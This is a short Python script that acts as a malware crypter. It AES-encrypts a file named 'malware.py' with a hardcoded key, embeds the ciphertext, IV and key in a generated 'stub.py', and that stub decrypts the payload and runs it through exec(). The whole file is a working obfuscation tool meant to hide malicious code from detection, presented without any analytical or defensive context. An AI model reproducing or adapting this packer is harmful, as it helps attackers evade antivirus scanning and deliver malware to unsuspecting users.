import os
from base64 import b64encode
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad

key = "@McQfTjWnZr4u7x!A%D*G-JaNdRgUkXp"


with open("malware.py", 'rb') as NFILE:
    malware_code = NFILE.read()

cryptor = AES.new(key.encode("utf-8"), AES.MODE_CBC)
encrypted_data = cryptor.encrypt(pad(malware_code, AES.block_size))
IV = b64encode(cryptor.iv).decode("utf-8")
encrypted_data = b64encode(encrypted_data).decode("utf-8")
key = b64encode(key.encode("utf-8")).decode("utf-8")

encrypted_data+= IV
encrypted_data+= key
print(len(IV))
print(encrypted_data)


stub_write = '''
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
from base64 import b64decode

encrypted_data = "{0}"
key = b64decode(encrypted_data[-44:])
IV = b64decode(encrypted_data[-68:-44])
encrypted_data = b64decode(encrypted_data[0:-68])

cipher = AES.new(key, AES.MODE_CBC, IV)
pt = unpad(cipher.decrypt(encrypted_data), AES.block_size)
# print(pt.decode())
exec(pt.decode())
'''.format(encrypted_data)


with open("stub.py", 'w') as NFILE:
    NFILE.write(stub_write)

# print(stub_write)